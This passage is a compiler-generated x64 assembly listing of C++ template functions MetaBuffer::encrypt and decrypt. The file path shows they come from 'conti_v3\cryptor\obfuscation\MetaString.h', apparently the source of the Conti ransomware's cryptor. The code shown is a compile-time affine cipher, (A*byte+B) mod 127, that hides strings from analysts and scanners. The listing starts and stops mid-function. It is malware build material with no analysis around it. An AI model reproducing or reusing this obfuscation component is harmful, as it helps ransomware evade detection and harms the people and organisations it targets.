	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0048d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@AEBAEE@Z ; MetaBuffer<5,125,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37> >::encrypt
  00492	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00499	88 41 1b	 mov	 BYTE PTR [rcx+27], al
  0049c	b8 01 00 00 00	 mov	 eax, 1
  004a1	48 6b c0 1b	 imul	 rax, rax, 27
  004a5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  004ac	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  004b0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  004b7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@AEBAEE@Z ; MetaBuffer<5,125,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37> >::encrypt
  004bc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  004c3	88 41 1c	 mov	 BYTE PTR [rcx+28], al
  004c6	b8 01 00 00 00	 mov	 eax, 1
  004cb	48 6b c0 1c	 imul	 rax, rax, 28
  004cf	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  004d6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  004da	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  004e1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@AEBAEE@Z ; MetaBuffer<5,125,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37> >::encrypt
  004e6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  004ed	88 41 1d	 mov	 BYTE PTR [rcx+29], al
  004f0	b8 01 00 00 00	 mov	 eax, 1
  004f5	48 6b c0 1d	 imul	 rax, rax, 29
  004f9	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00500	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00504	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0050b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@AEBAEE@Z ; MetaBuffer<5,125,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37> >::encrypt
  00510	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00517	88 41 1e	 mov	 BYTE PTR [rcx+30], al
  0051a	b8 01 00 00 00	 mov	 eax, 1
  0051f	48 6b c0 1e	 imul	 rax, rax, 30
  00523	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0052a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0052e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00535	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@AEBAEE@Z ; MetaBuffer<5,125,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37> >::encrypt
  0053a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00541	88 41 1f	 mov	 BYTE PTR [rcx+31], al
  00544	b8 01 00 00 00	 mov	 eax, 1
  00549	48 6b c0 1f	 imul	 rax, rax, 31
  0054d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00554	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00558	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0055f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@AEBAEE@Z ; MetaBuffer<5,125,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37> >::encrypt
  00564	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0056b	88 41 20	 mov	 BYTE PTR [rcx+32], al
  0056e	b8 01 00 00 00	 mov	 eax, 1
  00573	48 6b c0 20	 imul	 rax, rax, 32		; 00000020H
  00577	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0057e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00582	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00589	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@AEBAEE@Z ; MetaBuffer<5,125,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37> >::encrypt
  0058e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00595	88 41 21	 mov	 BYTE PTR [rcx+33], al
  00598	b8 01 00 00 00	 mov	 eax, 1
  0059d	48 6b c0 21	 imul	 rax, rax, 33		; 00000021H
  005a1	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  005a8	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  005ac	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  005b3	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@AEBAEE@Z ; MetaBuffer<5,125,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37> >::encrypt
  005b8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  005bf	88 41 22	 mov	 BYTE PTR [rcx+34], al
  005c2	b8 01 00 00 00	 mov	 eax, 1
  005c7	48 6b c0 22	 imul	 rax, rax, 34		; 00000022H
  005cb	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  005d2	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  005d6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  005dd	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@AEBAEE@Z ; MetaBuffer<5,125,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37> >::encrypt
  005e2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  005e9	88 41 23	 mov	 BYTE PTR [rcx+35], al
  005ec	b8 01 00 00 00	 mov	 eax, 1
  005f1	48 6b c0 23	 imul	 rax, rax, 35		; 00000023H
  005f5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  005fc	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00600	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00607	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@AEBAEE@Z ; MetaBuffer<5,125,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37> >::encrypt
  0060c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00613	88 41 24	 mov	 BYTE PTR [rcx+36], al
  00616	b8 01 00 00 00	 mov	 eax, 1
  0061b	48 6b c0 24	 imul	 rax, rax, 36		; 00000024H
  0061f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00626	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0062a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00631	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@AEBAEE@Z ; MetaBuffer<5,125,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37> >::encrypt
  00636	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0063d	88 41 25	 mov	 BYTE PTR [rcx+37], al
  00640	b8 01 00 00 00	 mov	 eax, 1
  00645	48 6b c0 25	 imul	 rax, rax, 37		; 00000025H
  00649	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00650	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00654	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0065b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@AEBAEE@Z ; MetaBuffer<5,125,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37> >::encrypt
  00660	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00667	88 41 26	 mov	 BYTE PTR [rcx+38], al
  0066a	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00671	0f b6 40 01	 movzx	 eax, BYTE PTR [rax+1]
  00675	88 85 c0 00 00
	00		 mov	 BYTE PTR tv364[rbp], al

; 52   :     {
; 53   : 
; 54   :     }

  0067b	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00682	48 8d a5 d8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+216]
  00689	5f		 pop	 rdi
  0068a	5d		 pop	 rbp
  0068b	c3		 ret	 0
??0?$MetaBuffer@$04$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<5,125,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37> >::MetaBuffer<5,125,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?decrypt@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z PROC ; MetaBuffer<113,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::decrypt, COMDAT

; 79   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	83 e8 66	 sub	 eax, 102		; 00000066H
  0002d	6b c0 09	 imul	 eax, eax, 9
  00030	ba 7f 00 00 00	 mov	 edx, 127		; 0000007fH
  00035	8b c8		 mov	 ecx, eax
  00037	e8 00 00 00 00	 call	 ?positive_modulo@@YAHHH@Z ; positive_modulo

; 81   :     }

  0003c	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00043	5f		 pop	 rdi
  00044	5d		 pop	 rbp
  00045	c3		 ret	 0
?decrypt@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<113,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?encrypt@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z PROC ; MetaBuffer<113,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt, COMDAT

; 74   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 75   :         return (A * byte + B) % 127;

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	6b c0 71	 imul	 eax, eax, 113		; 00000071H
  0002d	83 c0 66	 add	 eax, 102		; 00000066H
  00030	99		 cdq
  00031	b9 7f 00 00 00	 mov	 ecx, 127		; 0000007fH
  00036	f7 f9		 idiv	 ecx
  00038	8b c2		 mov	 eax, edx

; 76   :     }

  0003a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00041	5f		 pop	 rdi
  00042	5d		 pop	 rbp
  00043	c3		 ret	 0
?encrypt@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<113,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
i$1 = 8
this$ = 256
?decrypt@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<113,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::decrypt, COMDAT

; 62   :     {

$LN7:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 63   :         if (!isDecrypted())

  0001f	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00026	e8 00 00 00 00	 call	 ?isDecrypted@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEBA_NXZ ; MetaBuffer<113,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::isDecrypted
  0002b	0f b6 c0	 movzx	 eax, al
  0002e	85 c0		 test	 eax, eax
  00030	75 53		 jne	 SHORT $LN5@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00032	48 c7 45 08 00
	00 00 00	 mov	 QWORD PTR i$1[rbp], 0
  0003a	eb 0b		 jmp	 SHORT $LN4@decrypt
$LN2@decrypt:
  0003c	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00040	48 ff c0	 inc	 rax
  00043	48 89 45 08	 mov	 QWORD PTR i$1[rbp], rax
$LN4@decrypt:
  00047	48 83 7d 08 42	 cmp	 QWORD PTR i$1[rbp], 66	; 00000042H
  0004c	73 37		 jae	 SHORT $LN3@decrypt

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0004e	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00052	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00059	48 03 c8	 add	 rcx, rax
  0005c	48 8b c1	 mov	 rax, rcx
  0005f	0f b6 50 01	 movzx	 edx, BYTE PTR [rax+1]
  00063	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
